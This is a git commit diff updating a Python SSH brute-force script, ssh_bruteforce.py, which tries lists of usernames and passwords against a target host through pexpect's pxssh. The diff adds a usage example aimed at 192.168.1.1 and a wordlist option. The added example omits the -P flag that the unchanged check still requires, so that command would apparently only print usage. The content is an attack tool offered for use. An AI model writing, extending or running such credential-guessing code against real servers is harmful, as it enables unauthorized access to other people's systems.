e2308f7a67f28589cadaeddb177bd8fb81c540d7
DIEGO <diegocracker@gmail.com>
2023-03-08 01:39:22 -0300

    Update ssh_bruteforce.py

--- ssh_bruteforce.py
+++ ssh_bruteforce.py
@@ -1,5 +1,6 @@
 # -*- coding: utf-8 -*-
 # @Autor: Diego Rodrigues Pereira
+# Comando: python ssh_bruteforce.py -H 192.168.1.1 -U users.txt -W wordlist.txt 
 import optparse
 from pexpect import pxssh
 import time
@@ -33,23 +34,35 @@ def connect(host, user, password, release):
 
 def run():
     parser = optparse.OptionParser('usage: '+'-H <target host> -U <userlist> -P <passlist>')
-    parser.add_option('-H', dest='tgtHost', type='string',help='specify target host')
-    parser.add_option('-U', dest='userList', type='string',help='specify user list file')
-    parser.add_option('-P', dest='passList', type='string',help='specify password list file')
-    parser.add_option('-c', dest='count', type='int',help='specify the max ssh connect count , default 5',default=5)
+    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
+    parser.add_option('-U', dest='userList', type='string', help='specify user list file')
+    parser.add_option('-P', dest='passList', type='string', help='specify password list file')
+    parser.add_option('-W', dest='wordlist', type='string', help='specify wordlist file')
+    parser.add_option('-c', dest='count', type='int', help='specify the max ssh connect count, default 5', default=5)
     (options, args) = parser.parse_args()
+
     global connection_lock
     connection_lock = threading.BoundedSemaphore(options.count)
+
     host = options.tgtHost
     userListFile = options.userList
     passListFile = options.passList
+    wordlistFile = options.wordlist
+
     if host == None or userListFile == None or passListFile == None:
         print(parser.usage)
         exit(0)
-    with open(userListFile,'r') as users:
+
+    with open(userListFile, 'r') as users:
         userList = users.read().splitlines()
-    with open(passListFile,'r') as passes:
-        passList = passes.read().splitlines()
+
+    if wordlistFile:
+        with open(wordlistFile, 'r') as f:
+            passList = f.read().splitlines()
+    else:
+        with open(passListFile, 'r') as passes:
+            passList = passes.read().splitlines()
+
     for user in userList:
         for password in passList:
             if Found:
